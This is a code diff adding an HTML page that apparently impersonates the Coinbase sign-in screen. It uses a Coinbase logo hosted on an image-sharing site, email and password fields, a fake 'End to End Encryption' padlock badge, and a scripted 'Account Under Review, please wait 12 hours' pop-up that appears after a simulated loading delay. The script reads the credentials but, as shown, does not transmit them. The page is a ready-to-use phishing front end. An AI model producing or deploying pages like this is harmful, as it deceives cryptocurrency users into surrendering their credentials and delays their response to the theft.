@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In - Coinbase</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 40px 20px;
+      box-sizing: border-box;
+      overflow-x: hidden;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+      width: 150px;
+      margin-bottom: 30px;
+      filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.5));
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .login-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: #ffffff;
+    }
+
+    .login-text {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 25px;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+      width: 100%;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background-color: #2c2c2c;
+      color: white;
+      font-size: 14px;
+      box-sizing: border-box;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .form-group input::placeholder {
+      color: #888888;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      background-color: #333333;
+      box-shadow: 0 0 0 2px #4c8ffb;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-primary {
+      background-color: #4c8ffb;
+      color: #000000;
+    }
+
+    .btn-primary:hover {
+      background-color: #367af6;
+      transform: translateY(-2px);
+    }
+
+    .btn.loading .btn-text {
+      visibility: hidden;
+    }
+
+    .btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #000000;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .footer-links {
+      margin-top: 20px;
+      font-size: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-weight: 400;
+    }
+
+    .footer-links a {
+      color: #4c8ffb;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    .footer-links a:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    /* End to End Encryption Text with CSS Padlock */
+    .encryption-text {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #888888;
+      margin-top: 20px;
+      text-align: center;
+      font-weight: 400;
+    }
+
+    .padlock {
+      width: 16px;
+      height: 20px;
+      position: relative;
+      display: inline-block;
+      filter: brightness(0.7);
+    }
+
+    .padlock::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 4px;
+      width: 8px;
+      height: 8px;
+      border: 2px solid #888888;
+      border-bottom: none;
+      border-radius: 8px 8px 0 0;
+      animation: lock-shackle 0.5s ease-in-out;
+    }
+
+    .padlock::after {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 0;
+      width: 16px;
+      height: 12px;
+      background: #888888;
+      border-radius: 2px;
+      box-shadow: 0 0 8px rgba(136, 136, 136, 0.5);
+    }
+
+    @keyframes lock-shackle {
+      0% { transform: translateY(2px); }
+      50% { transform: translateY(-2px); }
+      100% { transform: translateY(0); }
+    }
+
+    /* Error Pop-up Styles */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+      animation: fadeInOverlay 0.3s ease;
+    }
+
+    @keyframes fadeInOverlay {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .popup {
+      background: #1a1a1a;
+      border-radius: 12px;
+      padding: 25px;
+      max-width: 350px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+      animation: popupScale 0.3s ease;
+    }
+
+    @keyframes popupScale {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .popup-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #ff4d4f;
+      margin-bottom: 12px;
+    }
+
+    .popup-text {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 20px;
+      line-height: 1.6;
+      font-weight: 400;
+    }
+
+    .popup-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      background-color: #4c8ffb;
+      color: #000000;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .popup-btn:hover {
+      background-color: #367af6;
+      transform: translateY(-2px);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://i.ibb.co/vvxn966F/In-Shot-20250418-173504055.png" alt="Coinbase Logo" class="logo">
+    <div class="login-title">Sign In to Coinbase</div>
+    <div class="login-text">
+      Enter your email and password to access your account securely.
+    </div>
+
+    <form id="login-form">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="Enter your email" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+
+      <button type="submit" class="btn btn-primary" id="signin-btn">
+        <span class="btn-text">Sign In</span>
+      </button>
+    </form>
+
+    <div class="footer-links">
+      <a href="reset-password.html">Forgot password?</a>
+      <a href="#">Sign in with Passkey</a>
+    </div>
+
+    <div class="encryption-text">
+      <span class="padlock"></span>
+      End to End Encryption
+    </div>
+  </div>
+
+  <!-- Error Pop-up -->
+  <div class="popup-overlay" id="popup-overlay">
+    <div class="popup">
+      <div class="popup-title">Account Under Review</div>
+      <div class="popup-text">
+        Your account is under review. Please wait 12 hours before proceeding.
+      </div>
+      <button class="popup-btn" id="popup-btn">Cancel</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const signinBtn = document.getElementById('signin-btn');
+      const popupOverlay = document.getElementById('popup-overlay');
+
+      // Basic client-side validation
+      if (!email.includes('@')) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+      if (password.length < 8) {
+        alert('Password must be at least 8 characters long.');
+        return;
+      }
+
+      // Show loading effect
+      signinBtn.classList.add('loading');
+      signinBtn.disabled = true;
+
+      // Show error pop-up after loading
+      setTimeout(() => {
+        signinBtn.classList.remove('loading');
+        signinBtn.disabled = false;
+        popupOverlay.style.display = 'flex';
+      }, 4000);
+    });
+
+    // Handle pop-up cancel button
+    document.getElementById('popup-btn').addEventListener('click', function() {
+      document.getElementById('popup-overlay').style.display = 'none';
+    });
+  </script>
+</body>
+</html>
